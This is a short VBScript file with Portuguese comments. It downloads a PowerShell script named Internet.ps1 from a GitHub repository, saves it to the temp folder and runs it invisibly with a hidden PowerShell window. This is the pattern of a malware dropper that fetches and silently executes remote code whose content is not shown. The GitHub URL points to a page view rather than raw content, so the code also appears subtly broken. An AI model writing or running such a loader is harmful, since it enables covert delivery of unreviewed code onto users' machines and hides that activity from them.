' URL do script PowerShell no GitHub
scriptUrl = "https://github.com/vciscato/Popup/blob/b81c378aec31630496f44f63693f714eb607ed02/Internet.ps1"

' Caminho temporário para salvar o script PowerShell
tempScriptPath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\temp_script.ps1"

' Criar o objeto XMLHTTP para baixar o arquivo
Set http = CreateObject("MSXML2.XMLHTTP")
http.open "GET", scriptUrl, False
http.send

' Salvar o conteúdo do script PowerShell no arquivo temporário
If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1 ' Tipo binário
    stream.Write http.responseBody
    stream.Position = 0
    stream.Type = 2 ' Tipo texto
    stream.Charset = "utf-8"
    stream.SaveToFile tempScriptPath, 2 ' Salvar como arquivo
    stream.Close
End If

' Executar o script PowerShell de forma invisível
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -nologo -windowstyle hidden -file """ & tempScriptPath & """", 0

' Limpar objetos
Set http = Nothing
Set stream = Nothing
Set objShell = Nothing